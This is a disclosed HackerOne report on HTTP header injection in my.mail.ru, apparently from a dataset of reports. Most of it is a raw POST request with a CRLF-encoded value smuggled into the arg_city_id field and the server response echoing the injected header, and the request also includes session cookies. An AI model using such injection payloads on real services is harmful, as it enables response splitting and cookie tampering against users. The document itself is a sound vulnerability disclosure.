---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '16967'
original_report_id: '16967'
title: 'my.mail.ru: HTTP Header Injection'
team_handle: mailru
created_at: '2014-06-19T18:28:36.541Z'
disclosed_at: '2015-09-13T12:01:51.206Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
---

# my.mail.ru: HTTP Header Injection

## Metadata

- HackerOne Report ID: 16967
- Weakness: 
- Program: mailru
- Disclosed At: 2015-09-13T12:01:51.206Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

HTTP Header Injection нашелся, вот =)

POST /cgi-bin/my/ajax HTTP/1.1
Host: my.mail.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://my.mail.ru/my/welcome
Content-Length: 226
Cookie: mrcu=C3EB52FA632E5958028A5821010A; p=8BkAAFHOkAAA; VID=3grP2o1i30nE:; s=fver=13|a=0|rt=1|dpr=2|s_vp=(1093/574); i=AQBewKJTBAATAAgTBlwAATABAWQBAY0BAdwEAvQEAl0ABQIBAMkABQIBAFgDCAQBAQAB; b=bz8jAHCCEQIA8OwywZ0mM4h8RQmESZcAyvgREHFlglIcjPAiEw6mVawBBPQmuH6Mho8JDXHoZhCSDx/G9XFD2D5uCFtdDaHqrSAce4GI8lGCEFaHEtqcCUIAAEC4hTYJl80PYQgjRaxQaISpt4Jxf/Yg9gMexO1bwQjThxAFzQQh/uwhpD8vBJMdQxJQmZJCSPW2ISHNPy+E9MtPEMT9L0MQK2UlI7d7Z4S8gr0gRLahiRB7iyZivNGKhNPChiLOwONDOP0KJQEA; searchuid=9987040291391447473; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACAAAkGpQcA; _ga=GA1.2.145097379.1400943163; s_cp=dpr=2; c=W9GdUwAAAMvTAAASAQAAfgCA; mc2=games.mail.ru; sdc=6hGHke5AZPtnUKQF; mc1=1403201320; posts_subscriptions=isox.pentest.4@mail.ru; Mpop=1403202184:4f5e5967795f4040190502190805001b0b0c1d04034568515c455f080407030a1f07097d1651425f491945525b4551444d1f041755535b54174b44:isox.pentest.4@mail.ru:
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

ajax_call=1&func_name=welcome.save_edu&mna=685277&mnb=-361874689&arg_type=school&arg_city_id=290756f%0d%0aHeader-Injection:MyHeader%0d%0a&arg_institute_id=81345&arg_supname=&arg_startdate=1964&arg_leavedate=1975&arg_class=1964




HTTP/1.1 200 OK
Server: nginx/1.2.9
Date: Thu, 19 Jun 2014 18:26:24 GMT
Content-Type: text/html; charset=windows-1251
Connection: close
Set-Cookie: geo_city_id=290756f
Header-Injection: MyHeader
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Length: 106

Content-Type: text/plain; charset=UTF-8
Expires: Thu, 01 Jan 1970 00:00:01 GMT

["AjaxResponse","OK","ok"]

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
